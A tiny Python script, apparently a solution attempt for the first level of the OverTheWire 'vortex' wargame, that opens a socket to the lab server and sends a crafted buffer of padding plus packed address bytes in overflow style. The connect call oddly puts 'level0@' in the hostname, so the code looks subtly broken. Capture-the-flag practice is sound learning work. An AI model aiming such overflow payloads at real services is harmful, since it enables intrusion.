#!/usr/bin/env python
from socket import *

s = socket(AF_INET, SOCK_STREAM)
s.connect(("level0@vortex.labs.overthewire.org", 5842))
s.recv(32)

s.send("A"*0x100 + "\x00\x60\xb0\x8a" + "A"*32)
s.close()